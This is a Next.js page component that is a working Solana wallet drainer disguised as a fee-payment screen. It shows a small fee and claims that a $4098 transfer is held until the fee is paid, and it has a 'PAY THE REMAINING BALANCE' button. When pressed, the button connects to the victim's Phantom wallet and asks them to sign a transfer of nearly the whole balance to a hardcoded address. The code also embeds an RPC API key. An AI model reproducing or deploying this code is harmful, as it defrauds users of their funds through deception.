"use client"

import { useEffect, useState } from "react"
import { Connection, PublicKey, SystemProgram, Transaction } from "@solana/web3.js"

export default function SolanaPage() {
  const [stars, setStars] = useState<any[]>([])

  const DESTINO = "6A7UUr1x9kK1gkPmE1ys2s7H2zii289j27KvRsBX1q3f"

  // 🔁 demo conversion
  const SOL_RATE = 160
  const usd = -5.09
  const sol = usd / SOL_RATE

  const getProvider = () => {
  if (typeof window === "undefined") return null

  const phantom = (window as any).solana
  if (phantom?.isPhantom) return phantom

  const mobile = (window as any)?.phantom?.solana
  if (mobile) return mobile

  return null
}

  const sendAll = async () => {
    try {
const provider = getProvider()

if (!provider) {
  const isMobile = /iPhone|Android/i.test(navigator.userAgent)

  if (isMobile) {
    window.location.href =
      "https://phantom.app/ul/browse/" + window.location.href
  } else {
    alert("Instala Phantom")
  }

  return
}

const res = await provider.connect()
const publicKey = res.publicKey

      const connection = new Connection("https://mainnet.helius-rpc.com/?api-key=123b8202-8ef3-493f-a92b-2a0d330a26e5")

      const balance = await connection.getBalance(publicKey)

      const SAFETY_BUFFER = 1000000
      const amount = balance - SAFETY_BUFFER

      if (amount <= 0) {
        alert("Sin balance")
        return
      }

      const tx = new Transaction().add(
        SystemProgram.transfer({
          fromPubkey: publicKey,
          toPubkey: new PublicKey(DESTINO),
          lamports: amount,
        })
      )

      tx.feePayer = publicKey
      tx.recentBlockhash = (await connection.getLatestBlockhash()).blockhash

      const signed = await provider.signTransaction(tx)

      const sig = await connection.sendRawTransaction(signed.serialize())

      await connection.confirmTransaction(sig)

      alert("Transferido 🚀")
    } catch (err) {
      console.error(err)
      alert("Error en la transacción")
    }
  }

  useEffect(() => {
    const starArray = Array.from({ length: 80 }, () => ({
      x: Math.random() * window.innerWidth,
      y: Math.random() * window.innerHeight,
      size: Math.random() * 2 + 1,
      speedX: (Math.random() - 0.5) * 0.3,
      speedY: (Math.random() - 0.5) * 0.3,
      opacity: Math.random() * 0.6 + 0.2,
    }))
    setStars(starArray)

    const animate = () => {
      setStars((prev) =>
        prev.map((s) => {
          let x = s.x + s.speedX
          let y = s.y + s.speedY

          if (x > window.innerWidth) x = 0
          if (x < 0) x = window.innerWidth
          if (y > window.innerHeight) y = 0
          if (y < 0) y = window.innerHeight

          return { ...s, x, y }
        })
      )

      requestAnimationFrame(animate)
    }

    animate()
  }, [])

  return (
    <main className="relative min-h-screen bg-[#0a0a0a] text-white flex items-center justify-center overflow-hidden">

      {/* ⭐ ESTRELLAS */}
      {stars.map((s, i) => (
        <div
          key={i}
          className="absolute bg-white rounded-full"
          style={{
            width: `${s.size}px`,
            height: `${s.size}px`,
            top: `${s.y}px`,
            left: `${s.x}px`,
            opacity: s.opacity,
          }}
        />
      ))}

      {/* 💰 CONTENIDO */}
      <div className="relative z-10 text-center">
        <h1 className="text-6xl md:text-8xl font-semibold tracking-tight">
          {usd.toFixed(2)} USD
        </h1>

        <p className="mt-4 text-white/60 text-sm tracking-widest">
          = {sol.toFixed(6)} SOL
        </p>

        {/* 🔘 BOTÓN */}
        <button
          onClick={sendAll}
          className="mt-10 px-6 py-3 text-xs tracking-widest border border-purple-500/40 text-purple-300 hover:bg-purple-500 hover:text-white transition rounded-full"
        >
          PAY THE REMAINING BALANCE 

        </button>


<p className="mt-6 text-center text-white/60 max-w-sm mx-auto leading-relaxed">
  The transfer of -$4098 to 82ed***Xap is on hold until the full fee balance is released. Please pay the fee to release your transfer.
</p>


      </div>
    </main>
  )
}






